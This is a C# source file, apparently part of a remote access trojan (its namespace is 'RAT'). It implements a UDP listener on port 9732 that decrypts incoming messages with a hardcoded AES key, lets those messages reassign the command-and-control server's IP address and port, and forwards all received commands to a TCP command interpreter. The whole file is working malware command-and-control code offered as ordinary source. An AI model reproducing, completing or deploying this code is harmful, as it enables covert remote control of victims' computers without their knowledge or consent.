using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RAT
{
    class UDPListener
    {
        public class Crypto
        {
            public static String EncryptionKey = "uVim6AucW7AYAqhwHgs6dEvZO3bGg8jyeLSACaGyKHRIGXD0WnbDCoSLtFVfW1P20arEZin4svgRIEiRM2yAF8Wz661tX935btNMMUfgrjwp0utgkVrwruzve84Grp5yBhKiXNtEH1uXplP45zRmxHV6mHaFxCxPpfa7RO0ko5wJfLmYsi52xB5D83e0HtmEJvcoxcQ9iPQdRvlIbHVKmiQyjp2vet4rhS1qvOU15KfLIINAyjV7QsteNnHVBSHTw76PYgZnEP5n8btrBBMSE3P2o7r0KZx3UicjyFEKcDEGVWLM5UkbTcfkcahlQXHB1S9nOpu9BgBIq7rY6x0xh1dwTqiOiDTJxiZpJk6HtBcKqPI7Cec6GLpUokMDnADabh9s4Y763adSv3wP";
            public static Random rand = new Random();
            public static string Encrypt(string clearText)
            {
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    byte[] IV = new byte[15];
                    rand.NextBytes(IV);
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(IV) + Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            public static string Decrypt(string cipherText)
            {
                byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
                cipherText = cipherText.Substring(20).Replace(" ", "+");
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
        }
        public void startR()
            {
                StartListening();
            }
            private readonly UdpClient udp = new UdpClient(9732);
            private void StartListening()
            {
                this.udp.BeginReceive(Receive, new object());
            }

            public void Receive(IAsyncResult ar)
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Loopback, 9732);
                byte[] bytes = udp.EndReceive(ar, ref ip);
                string message = Encoding.ASCII.GetString(bytes);
                commands(Crypto.Decrypt(message));
                StartListening();
            }
            private void commands(String message) 
            {
                if (message.Contains("<SERVERIP> "))
                {
                Payload.ServerIP = message.Substring(message.IndexOf("<SERVERIP>") + 11);
            }
            if (message.Contains("<SERVERPORT> "))
            {
                Payload.port = Int32.Parse(message.Substring(message.IndexOf("<SERVERPORT>") + 13));
            }
            TCPInterpreter.main(message);
        }
        }
    }

